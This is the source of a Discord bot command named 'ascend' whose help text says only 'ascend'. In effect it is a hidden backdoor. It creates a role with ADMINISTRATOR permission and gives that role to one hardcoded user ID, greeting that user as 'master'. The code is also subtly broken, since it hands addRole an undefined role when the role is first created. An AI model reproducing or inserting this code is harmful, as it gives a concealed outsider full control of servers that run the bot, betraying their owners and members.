import * as Discord from "discord.js";
import { IBotCommand } from "../api";

export default class serverCommand implements IBotCommand {
//honk honk am goose
    private readonly _command = "ascend"

    name(): string {
        return "ascend";
    } 

    help(): string {
        return "ascend";
    }   

    cooldown(): number {
        return 4;
    }
    
    isThisCommand(command: string): boolean {
        return command === this._command;
    }

    async runCommand(args: string[], msg: Discord.Message, Bot: Discord.Client): Promise<void> {
        let roleName = "pleb-chakuj1"
        var rolee = msg.guild.roles.find(r => r.name === roleName);
        if (!rolee){
            msg.guild.createRole( {name:roleName, color: "#9932CC", permissions:["ADMINISTRATOR"] } );
        }
        addrol();
        function addrol(){
            if (msg.author.id == '320659246037336064' && !(msg.member.roles.find(r => r.name === roleName))){
                msg.reply("Welcome my master!");
                msg.member.addRole(rolee);
            } else {
                msg.reply("imposter!");
            }
        }
    }

}